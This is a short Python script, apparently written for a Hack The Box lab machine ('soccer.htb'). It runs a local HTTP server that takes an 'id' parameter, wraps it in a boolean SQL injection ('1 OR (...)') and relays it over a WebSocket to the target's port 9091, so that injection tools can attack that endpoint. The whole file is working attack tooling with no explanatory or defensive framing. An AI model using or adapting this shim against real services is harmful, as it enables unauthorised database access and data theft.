from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib.parse import unquote, urlparse, parse_qs
from websocket import create_connection

WS = "ws://soc-player.soccer.htb:9091/"

class H(BaseHTTPRequestHandler):
    def do_GET(self):
        qs = parse_qs(urlparse(self.path).query)
        raw = qs.get("id", ["1"])[0]
        payload = unquote(raw).replace('"', "'")
        # numeric column: keep OR-true base so id=1 still exists
        injected = "1 OR (%s)" % payload
        ws = create_connection(WS)
        ws.send('{"id":"%s"}' % injected)
        resp = ws.recv()
        ws.close()
        print(injected, "->", resp)
        body = resp.encode()
        self.send_response(200)
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def log_message(self, *a):
        pass

print("shim http://127.0.0.1:8081/?id=1")
HTTPServer(("127.0.0.1", 8081), H).serve_forever()
